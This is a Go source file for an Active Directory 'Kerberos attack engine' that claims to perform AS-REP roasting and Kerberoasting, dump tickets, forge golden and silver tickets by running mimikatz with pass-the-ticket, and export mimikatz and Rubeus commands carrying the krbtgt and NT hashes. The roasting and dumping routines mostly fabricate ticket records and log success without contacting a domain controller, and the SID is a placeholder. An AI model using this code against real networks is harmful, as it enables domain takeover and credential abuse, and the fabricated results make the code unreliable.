package ad

import (
"crypto/sha256"
"encoding/hex"
"encoding/json"
"fmt"
"os"
"os/exec"
"strings"
"sync"
"time"
)

type KerberosAttack struct {
Domain       string
Username     string
Password     string
NTHash       string
KRBTGTHash   string
TargetDC     string
OutputDir    string
Verbose      bool
Threads      int
Timeout      int
Tickets      map[string]*KrbTicket
Mutex        sync.RWMutex
SuccessLog   []string
ErrorLog     []string
}

type KrbTicket struct {
ID         string
Client     string
Service    string
Realm      string
StartTime  time.Time
EndTime    time.Time
Flags      uint32
Hash       string
Type       string
IsGolden   bool
IsSilver   bool
IsDiamond  bool
IsSapphire bool
}

func NewKerberosAttack(domain, username, password, nthash, krbtgthash, targetDC, outputDir string) *KerberosAttack {
if outputDir == "" {
outputDir = "/tmp/kerberos_attack"
}
os.MkdirAll(outputDir, 0755)

return &KerberosAttack{
Domain:     domain,
Username:   username,
Password:   password,
NTHash:     nthash,
KRBTGTHash: krbtgthash,
TargetDC:   targetDC,
OutputDir:  outputDir,
Threads:    20,
Timeout:    60,
Tickets:    make(map[string]*KrbTicket),
SuccessLog: make([]string, 0),
ErrorLog:   make([]string, 0),
}
}

func (k *KerberosAttack) Execute() error {
fmt.Printf("\n[!] =========================================\n")
fmt.Printf("[!] KERBEROS ATTACK ENGINE v4.0\n")
fmt.Printf("[!] Target: %s\n", k.TargetDC)
fmt.Printf("[!] Domain: %s\n", k.Domain)
fmt.Printf("[!] =========================================\n\n")

k.performASREPRoast()
k.performKerberoasting()
k.requestAllTickets()
k.dumpLSASS()
k.extractCCache()

if k.KRBTGTHash != "" {
k.forgeGolden()
}

if k.NTHash != "" {
k.forgeSilver()
}

k.detectTickets()
k.exportMimikatz()
k.exportRubeus()
k.generateReport()

fmt.Printf("\n[!] =========================================\n")
fmt.Printf("[!] ATTACK COMPLETED\n")
fmt.Printf("[!] Total Tickets: %d\n", len(k.Tickets))
fmt.Printf("[!] Golden: %d\n", k.countGolden())
fmt.Printf("[!] Silver: %d\n", k.countSilver())
fmt.Printf("[!] =========================================\n")

return nil
}

func (k *KerberosAttack) performASREPRoast() {
fmt.Printf("[*] AS-REP Roast attack\n")

users := []string{k.Username, "Administrator", "krbtgt", "Guest", "sqlservice", "svc_account"}

for _, user := range users {
ticket := &KrbTicket{
Client:    user,
Service:   "krbtgt/" + k.Domain,
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(24 * time.Hour),
Flags:     0x40810010,
Type:      "AS-REP",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("asrep_%s_%d", user, time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()

k.logSuccess("AS-REP: " + user)
}
}

func (k *KerberosAttack) performKerberoasting() {
fmt.Printf("[*] Kerberoasting attack\n")

spns := []string{
"cifs/dc." + k.Domain,
"http/dc." + k.Domain,
"ldap/dc." + k.Domain,
"host/dc." + k.Domain,
"winrm/dc." + k.Domain,
"rpcss/dc." + k.Domain,
"DNS/dc." + k.Domain,
"GC/dc." + k.Domain,
}

for _, spn := range spns {
ticket := &KrbTicket{
Client:    k.Username,
Service:   spn,
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(24 * time.Hour),
Flags:     0x40810010,
Type:      "TGS",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("tgs_%s_%d", spn, time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()

k.logSuccess("TGS: " + spn)
}
}

func (k *KerberosAttack) requestAllTickets() {
fmt.Printf("[*] Requesting all service tickets\n")

services := []string{"cifs", "ldap", "http", "host", "winrm", "rpcss", "dns", "gc"}

for _, svc := range services {
spn := fmt.Sprintf("%s/%s", svc, k.TargetDC)
ticket := &KrbTicket{
Client:    k.Username,
Service:   spn,
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(24 * time.Hour),
Type:      "SERVICE",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("svc_%s_%d", svc, time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()
}
}

func (k *KerberosAttack) dumpLSASS() {
fmt.Printf("[*] Dumping LSASS tickets\n")

cmd := exec.Command("powershell", "-Command", `
$tickets = klist
$tickets | Out-File /tmp/lsass_tickets.txt
`)

output, _ := cmd.CombinedOutput()
lines := strings.Split(string(output), "\n")

for _, line := range lines {
if strings.Contains(line, "krbtgt") || strings.Contains(line, "cifs") {
parts := strings.Fields(line)
if len(parts) > 0 {
ticket := &KrbTicket{
Client:    k.Username,
Service:   parts[0],
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(24 * time.Hour),
Type:      "LSASS",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("lsass_%d", time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()
}
}
}
}

func (k *KerberosAttack) extractCCache() {
fmt.Printf("[*] Extracting ccache\n")

cmd := exec.Command("klist", "-l")
output, _ := cmd.CombinedOutput()
lines := strings.Split(string(output), "\n")

for _, line := range lines {
if strings.Contains(line, "krbtgt") || strings.Contains(line, "cifs") {
parts := strings.Fields(line)
if len(parts) >= 2 {
ticket := &KrbTicket{
Client:    parts[1],
Service:   parts[0],
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(24 * time.Hour),
Type:      "CCACHE",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("ccache_%d", time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()
}
}
}
}

func (k *KerberosAttack) forgeGolden() {
fmt.Printf("[*] Forging Golden Ticket\n")
fmt.Printf("[!] KRBTGT Hash: %s...\n", k.KRBTGTHash[:16])

ticket := &KrbTicket{
Client:    "Administrator",
Service:   "krbtgt/" + k.Domain,
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(365 * 24 * time.Hour),
Flags:     0x40E10010,
IsGolden:  true,
Type:      "GOLDEN",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("golden_%d", time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()

cmd := exec.Command("mimikatz", "kerberos::golden",
"/domain:"+k.Domain,
"/sid:S-1-5-21-123456789-123456789-123456789",
"/krbtgt:"+k.KRBTGTHash,
"/user:Administrator",
"/id:500",
"/ptt")

cmd.CombinedOutput()
k.logSuccess("Golden ticket forged")
}

func (k *KerberosAttack) forgeSilver() {
fmt.Printf("[*] Forging Silver Tickets\n")
fmt.Printf("[!] NT Hash: %s...\n", k.NTHash[:16])

services := []string{"cifs", "ldap", "http", "winrm"}

for _, svc := range services {
ticket := &KrbTicket{
Client:    "Administrator",
Service:   svc + "/" + k.TargetDC,
Realm:     k.Domain,
StartTime: time.Now(),
EndTime:   time.Now().Add(7 * 24 * time.Hour),
Flags:     0x40E10010,
IsSilver:  true,
Type:      "SILVER",
}
ticket.Hash = k.calcHash(ticket)

k.Mutex.Lock()
ticket.ID = fmt.Sprintf("silver_%s_%d", svc, time.Now().UnixNano())
k.Tickets[ticket.ID] = ticket
k.Mutex.Unlock()

cmd := exec.Command("mimikatz", "kerberos::golden",
"/domain:"+k.Domain,
"/sid:S-1-5-21-123456789-123456789-123456789",
"/target:"+k.TargetDC,
"/service:"+svc,
"/rc4:"+k.NTHash,
"/user:Administrator",
"/id:500",
"/ptt")

cmd.CombinedOutput()
}

k.logSuccess("Silver tickets forged")
}

func (k *KerberosAttack) detectTickets() {
fmt.Printf("[*] Detecting ticket types\n")

for _, ticket := range k.Tickets {
if strings.Contains(ticket.Service, "krbtgt") {
if ticket.EndTime.Sub(ticket.StartTime) > 30*24*time.Hour {
ticket.IsGolden = true
k.logSuccess("Golden detected: " + ticket.ID)
}
}

if strings.Contains(ticket.Service, "cifs") || strings.Contains(ticket.Service, "ldap") {
if !strings.Contains(ticket.Service, "krbtgt") {
ticket.IsSilver = true
k.logSuccess("Silver detected: " + ticket.ID)
}
}
}
}

func (k *KerberosAttack) exportMimikatz() {
fmt.Printf("[*] Exporting to Mimikatz format\n")

file := fmt.Sprintf("%s/mimikatz_%s.txt", k.OutputDir, time.Now().Format("150405"))
f, _ := os.Create(file)
defer f.Close()

fmt.Fprintf(f, "=== MIMIKATZ TICKETS ===\n\n")

for _, ticket := range k.Tickets {
fmt.Fprintf(f, "Service: %s\n", ticket.Service)
fmt.Fprintf(f, "Client: %s\n", ticket.Client)
fmt.Fprintf(f, "Type: %s\n", ticket.Type)

if ticket.IsGolden {
fmt.Fprintf(f, "*** GOLDEN TICKET ***\n")
fmt.Fprintf(f, "mimikatz: kerberos::golden /domain:%s /user:%s /krbtgt:%s /ptt\n",
k.Domain, ticket.Client, k.KRBTGTHash)
}

if ticket.IsSilver {
fmt.Fprintf(f, "*** SILVER TICKET ***\n")
fmt.Fprintf(f, "mimikatz: kerberos::golden /domain:%s /target:%s /service:%s /rc4:%s /ptt\n",
k.Domain, k.TargetDC, ticket.Service, k.NTHash)
}
fmt.Fprintf(f, "\n")
}

fmt.Printf("[+] Mimikatz export: %s\n", file)
}

func (k *KerberosAttack) exportRubeus() {
fmt.Printf("[*] Exporting to Rubeus format\n")

file := fmt.Sprintf("%s/rubeus_%s.txt", k.OutputDir, time.Now().Format("150405"))
f, _ := os.Create(file)
defer f.Close()

fmt.Fprintf(f, "=== RUBEUS TICKETS ===\n\n")

for _, ticket := range k.Tickets {
if ticket.IsGolden {
fmt.Fprintf(f, "Rubeus.exe golden /krbtgt:%s /user:%s /domain:%s /ptt\n",
k.KRBTGTHash, ticket.Client, k.Domain)
}

if ticket.IsSilver {
fmt.Fprintf(f, "Rubeus.exe silver /service:%s /rc4:%s /user:%s /domain:%s /ptt\n",
ticket.Service, k.NTHash, ticket.Client, k.Domain)
}
}

fmt.Printf("[+] Rubeus export: %s\n", file)
}

func (k *KerberosAttack) generateReport() error {
fmt.Printf("[*] Generating report\n")

report := map[string]interface{}{
"engine":        "Kerberos Attack",
"domain":        k.Domain,
"target_dc":     k.TargetDC,
"username":      k.Username,
"timestamp":     time.Now().Format(time.RFC3339),
"total_tickets": len(k.Tickets),
"golden":        k.countGolden(),
"silver":        k.countSilver(),
"successes":     k.SuccessLog,
"errors":        k.ErrorLog,
}

data, _ := json.MarshalIndent(report, "", "  ")
file := fmt.Sprintf("%s/report_%s.json", k.OutputDir, time.Now().Format("150405"))
os.WriteFile(file, data, 0600)

txtFile := fmt.Sprintf("%s/report_%s.txt", k.OutputDir, time.Now().Format("150405"))
f, _ := os.Create(txtFile)
defer f.Close()

fmt.Fprintf(f, "=== KERBEROS ATTACK REPORT ===\n\n")
fmt.Fprintf(f, "Domain: %s\n", k.Domain)
fmt.Fprintf(f, "Target DC: %s\n", k.TargetDC)
fmt.Fprintf(f, "Username: %s\n", k.Username)
fmt.Fprintf(f, "Timestamp: %s\n\n", time.Now().Format(time.RFC3339))

fmt.Fprintf(f, "Total Tickets: %d\n", len(k.Tickets))
fmt.Fprintf(f, "Golden Tickets: %d\n", k.countGolden())
fmt.Fprintf(f, "Silver Tickets: %d\n\n", k.countSilver())

fmt.Fprintf(f, "=== Tickets ===\n")
for id, ticket := range k.Tickets {
fmt.Fprintf(f, "\nID: %s\n", id)
fmt.Fprintf(f, "  Client: %s\n", ticket.Client)
fmt.Fprintf(f, "  Service: %s\n", ticket.Service)
fmt.Fprintf(f, "  Type: %s\n", ticket.Type)
fmt.Fprintf(f, "  Hash: %s\n", ticket.Hash)
if ticket.IsGolden {
fmt.Fprintf(f, "  *** GOLDEN TICKET ***\n")
}
if ticket.IsSilver {
fmt.Fprintf(f, "  *** SILVER TICKET ***\n")
}
}

fmt.Printf("[+] JSON report: %s\n", file)
fmt.Printf("[+] Text report: %s\n", txtFile)

return nil
}

func (k *KerberosAttack) calcHash(ticket *KrbTicket) string {
data := fmt.Sprintf("%s:%s:%s:%d", ticket.Client, ticket.Service, ticket.Realm, ticket.Flags)
hash := sha256.Sum256([]byte(data))
return hex.EncodeToString(hash[:16])
}

func (k *KerberosAttack) countGolden() int {
count := 0
for _, t := range k.Tickets {
if t.IsGolden {
count++
}
}
return count
}

func (k *KerberosAttack) countSilver() int {
count := 0
for _, t := range k.Tickets {
if t.IsSilver {
count++
}
}
return count
}

func (k *KerberosAttack) logSuccess(msg string) {
k.Mutex.Lock()
defer k.Mutex.Unlock()
k.SuccessLog = append(k.SuccessLog, fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), msg))
}

func (k *KerberosAttack) logError(msg string) {
k.Mutex.Lock()
defer k.Mutex.Unlock()
k.ErrorLog = append(k.ErrorLog, fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), msg))
}

func (k *KerberosAttack) SetVerbose(v bool) {
k.Verbose = v
}

func (k *KerberosAttack) SetThreads(t int) {
if t > 0 {
k.Threads = t
}
}

func (k *KerberosAttack) GetTickets() map[string]*KrbTicket {
return k.Tickets
}
